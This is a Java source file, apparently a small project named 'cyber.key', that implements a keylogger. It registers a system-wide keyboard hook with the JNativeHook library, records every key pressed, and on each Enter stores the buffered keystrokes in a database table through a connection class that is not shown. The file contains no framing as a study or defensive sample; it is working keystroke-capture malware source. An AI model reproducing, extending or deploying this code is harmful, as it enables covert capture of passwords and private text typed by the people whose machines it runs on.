package cyber.key;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.util.ArrayList;
import java.util.List;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Main implements NativeKeyListener {

    private static final Logger logger = LoggerFactory.getLogger(Main.class);
    private List<String> keyBuffer = new ArrayList<>();

    public static void main(String[] args) {
        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new Main());
    }

    private static void init() {
        java.util.logging.Logger nativeHookLogger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        nativeHookLogger.setLevel(java.util.logging.Level.WARNING);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        logger.info(keyText);

        if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
            if (!keyBuffer.isEmpty()) {
                try (Connection connection = Data.getConnection()) {
                    String insertKeys = "INSERT INTO dados (teclas) VALUES (?)";

                    try (PreparedStatement preparedStatement = connection.prepareStatement(insertKeys)) {
                        String word = String.join("", keyBuffer);
                        preparedStatement.setString(1, word);
                        preparedStatement.executeUpdate();
                    } catch (Exception ex) {
                        logger.error("Error executing query: {}", ex.getMessage(), ex);
                    }
                } catch (Exception ex) {
                    logger.error("Error while connecting to the database: {}", ex.getMessage(), ex);
                }
                keyBuffer.clear();
            }
        } else {
            keyBuffer.add(keyText);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
}
